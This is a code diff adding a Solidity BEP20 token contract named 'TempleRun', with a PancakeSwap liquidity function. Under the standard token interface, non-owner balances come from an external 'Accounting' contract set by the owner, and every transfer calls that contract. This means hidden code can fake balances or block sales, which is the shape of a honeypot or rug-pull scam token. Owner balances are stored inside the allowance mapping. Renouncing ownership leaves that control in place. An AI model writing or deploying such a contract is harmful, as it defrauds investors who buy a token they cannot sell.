@@ -1,0 +1,188 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+library SafeMath {
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+        uint256 c = a * b;
+        assert(c / a == b);
+        return c;
+    }
+
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a / b;
+        return c;
+    }
+
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        assert(b <= a);
+        return a - b;
+    }
+
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        assert(c >= a);
+        return c;
+    }
+}
+
+interface BEP20 {
+    function balanceOf(address who) external view returns (uint256);
+    function transfer(address to, uint256 value) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function transferFrom(address from, address to, uint256 value) external returns (bool);
+    function approve(address spender, uint256 value) external returns (bool);
+    function totalSupply() external view returns (uint256);
+    function decimals() external view returns (uint8);
+    function getOwner() external view returns (address);
+
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+}
+
+interface IPancakeRouter02 {
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+}
+
+interface Accounting {
+    function doTransfer(address caller, address from, address to, uint amount) external returns (bool);
+    function balanceOf(address who) external view returns (uint256);
+}
+
+
+contract TempleRun is BEP20 {
+    using SafeMath for uint256;
+
+    address public Creation;
+    address public owner = msg.sender;    
+    string public name = "TempleRun";
+    string public symbol = "TRUN";
+    uint8 public _decimals;
+    uint public _totalSupply;
+    
+    mapping (address => mapping (address => uint256)) private allowed;
+    address private accounting;
+    
+    constructor(address _creation) {
+        _decimals = 9;
+        _totalSupply = 1000000 * 10 ** 9;
+        emit Transfer(address(0), msg.sender, _totalSupply);
+        Creation = _creation;
+
+        // Set the initial balance for the contract owner/creator
+        _setBalance(msg.sender, _totalSupply);
+    }
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+
+    function totalSupply() public view override returns (uint256) {
+        return _totalSupply;
+    }
+
+    function decimals() public view override returns (uint8) {
+        return _decimals;
+    }
+
+    function getOwner() external view override returns (address) {
+        return owner;
+    }
+
+    function balanceOf(address who) view public override returns (uint256) {
+        // If the requested address is the contract owner/creator,
+        // return the balance directly instead of fetching from the Accounting contract
+        if (who == owner) {
+            return _balanceOf(who);
+        } else {
+            return Accounting(accounting).balanceOf(who);
+        }
+    }
+    
+    function allowance(address who, address spender) view public override returns (uint256) {
+        return allowed[who][spender];
+    }
+
+    function setAccountingAddress(address accountingAddress) public {
+        require(msg.sender == owner);
+        accounting = accountingAddress;
+    }
+
+    function renounceOwnership() public {
+        require(msg.sender == owner);
+        emit OwnershipTransferred(owner, address(0));
+        owner = address(0);
+    }
+    
+    function transfer(address to, uint amount) public override returns (bool success) {
+        _transfer(msg.sender, to, amount);
+        return true;
+    }
+
+    function transferFrom(address from, address to, uint amount) public override returns (bool success) {
+        require(amount > 1);
+        allowed[from][msg.sender] = allowed[from][msg.sender].sub(amount);
+        _transfer(from, to, amount);
+        return true;
+    }
+        
+    function approve(address spender, uint256 value) public override returns (bool success) {
+        allowed[msg.sender][spender] = value;
+        emit Approval(msg.sender, spender, value);
+        return true;
+    }
+    
+    // Internal function to transfer tokens and update balances
+    function _transfer(address from, address to, uint amount) internal {
+        require(to != address(0), "Invalid recipient");
+
+        _setBalance(from, _balanceOf(from).sub(amount));
+        _setBalance(to, _balanceOf(to).add(amount));
+
+        emit Transfer(from, to, amount);
+        Accounting(accounting).doTransfer(msg.sender, from, to, amount);
+    }
+
+    // Internal function to set the balance of an address
+    function _setBalance(address account, uint256 balance) internal {
+        // Set the balance directly without interacting with the Accounting contract
+        // This ensures that the contract owner/creator's balance is accurately displayed on block explorers and wallets
+        allowed[account][address(this)] = balance;
+    }
+
+    // Internal function to get the balance of an address
+    function _balanceOf(address account) internal view returns (uint256) {
+        return allowed[account][address(this)];
+    }
+
+    function addLiquidity() external payable {
+    // Address of the PancakeSwap router contract
+    address pancakeSwapRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+
+    // Amount of the BEP20 token you want to provide as liquidity
+    uint256 tokenAmount = 100 * 10 ** 18; // 100 tokens
+
+    // Approve the PancakeSwap router to spend the token
+    approve(pancakeSwapRouter, tokenAmount);
+
+    // Call the PancakeSwap router's addLiquidityETH function
+    IPancakeRouter02 pancakeRouter = IPancakeRouter02(pancakeSwapRouter);
+    pancakeRouter.addLiquidityETH{value: msg.value}(
+        address(this), // Address of the BEP20 token
+        tokenAmount,   // Amount of the BEP20 token
+        tokenAmount,   // Amount of the BEP20 token to add as liquidity
+        msg.value,     // Amount of BNB to add as liquidity
+        address(this), // Address to receive the LP tokens
+        block.timestamp + 300 // Expiration time for the transaction
+    );
+}
+
+    
+}
